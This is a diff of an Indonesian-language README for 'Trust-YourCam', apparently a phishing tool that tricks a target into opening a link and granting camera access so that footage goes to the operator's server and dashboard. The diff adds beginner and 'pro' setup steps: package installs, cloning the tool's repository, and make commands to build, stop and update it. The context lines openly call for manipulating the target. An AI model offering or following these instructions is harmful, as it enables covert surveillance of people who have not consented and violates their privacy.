@@ -27,7 +27,29 @@
 4. pancing target untuk membuka nya (manipulasi)
 5. Saat target membuka link dan memberikan akses kamera, data akan langsung terkirim ke server dan dapat dilihat melalui dashboard.
 
-<details open><summary><strong>Command & Penggunaan</strong></summary>
+<h3>Klik tutorial</h3>
+<details close><summary><strong>Command & Penggunaan <code>(pemula)</code></strong></summary>
+
+### 1. Install package 
+```bash
+pkg update
+pkg upgrade
+apt install git make
+```
+### 2. Clone Repositori
+```bash
+git clone https://github.com/ViewTechOrg/Trust-YourCam
+cd Trust-YourCam
+```
+### 3. command tools Trust-YourCam
+```bash
+make build # untuk menjalankan script
+make stop # untuk berhentikan program
+make update # untuk update
+```
+</details><br>
+
+<details close><summary><strong>Command & Penggunaan <code>(pro)</code></strong></summary>
 
 ### 1. Install package 
 ```bash
@@ -48,7 +70,7 @@ bash Server
 ```
 </details>
 
-### Environment Variables (ENV) - Pengaturan Mode Trust-YourCam
+### Environment Variables (ENV) - Pengaturan Mode Trust-YourCam (pro)
 
 Trust-YourCam mendukung pengaturan berbasis **environment variable** agar pengguna bisa mengontrol mode kerja tool sesuai kebutuhan. Dua variabel utama yang digunakan adalah:
 
@@ -69,7 +91,7 @@ Trust-YourCam mendukung pengaturan berbasis **environment variable** agar penggu
 
 ---
 
-### Contoh Penggunaan
+### Contoh Penggunaan `Pro`
 
 #### 1. Menjalankan Mode Interface
 
@@ -89,7 +111,7 @@ bash Server
 ### 3. Shutdown Software / mematikan progamnya
 untuk mematikan program setelah di gunakan bisa mengetikan perintah di bawah ini setelah di ctrl c di salah satu panel nya
 ```bash
-make clear
+make stop
 ```
 
 ### 📦 Teknologi yang Digunakan
